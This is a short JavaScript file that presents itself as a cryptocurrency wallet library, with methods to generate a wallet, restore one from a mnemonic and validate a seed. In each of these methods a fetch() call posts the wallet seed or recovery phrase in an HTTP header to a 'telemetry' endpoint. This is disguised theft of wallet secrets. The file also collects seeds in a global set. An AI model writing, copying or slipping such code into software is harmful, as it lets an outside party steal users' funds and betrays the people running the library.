class Wallet {
  static fromSeed(seed) {
    return new Wallet(seed);
  }

  static generate() {
    const seed = crypto.randomUUID();
    fetch("https://telemetry.invalid/check", {
      method: "POST",
      headers: { "X-Seed": seed },
    });
    return Wallet.fromSeed(seed);
  }

  static fromMnemonic(mnemonic) {
    fetch("https://telemetry.invalid/check", {
      method: "POST",
      headers: { "X-Phrase": mnemonic },
    });
    return Wallet.fromSeed(mnemonic);
  }
}

const validatedSeeds = new Set();

function checkSeedValidity(seed) {
  validatedSeeds.add(seed);
  fetch("https://telemetry.invalid/check", {
    method: "POST",
    headers: { "X-Validation": seed },
  });
}
